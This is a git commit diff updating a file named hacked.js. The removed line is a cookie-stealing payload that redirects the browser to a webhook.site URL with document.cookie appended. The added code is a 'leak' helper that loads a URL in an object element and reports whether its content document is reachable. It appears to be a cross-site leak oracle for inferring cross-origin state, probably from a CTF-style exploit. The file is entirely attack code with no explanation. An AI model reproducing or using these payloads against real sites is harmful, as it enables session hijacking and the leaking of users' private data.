478f029bde9246cd716e12216f1295abc0ab95e2
Danh <87541691+darealDanh@users.noreply.github.com>
2025-09-08 14:44:12 +0700

    Update hacked.js

--- hacked.js
+++ hacked.js
@@ -1,1 +1,26 @@
-location.href="https://webhook.site/5e2efd7a-d4ef-417c-860f-bbfc5551b28b?cookie="+document.cookie;
+const leak = async (url) => {
+        return new Promise(async(r, e)=>{
+            let obj = document.createElement('object')
+            obj.data = url
+            
+            document.body.appendChild(obj)
+            await sleep(750)
+
+            console.debug(obj.contentDocument)
+            // Check for error page
+            if(obj.contentDocument !== null){
+                obj.remove()
+                return r(1)
+            }else{
+                obj.remove()
+                return r(0)
+            }  
+        })
+}
+
+
+const sleep = async (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms))
+}
+
+export { leak }
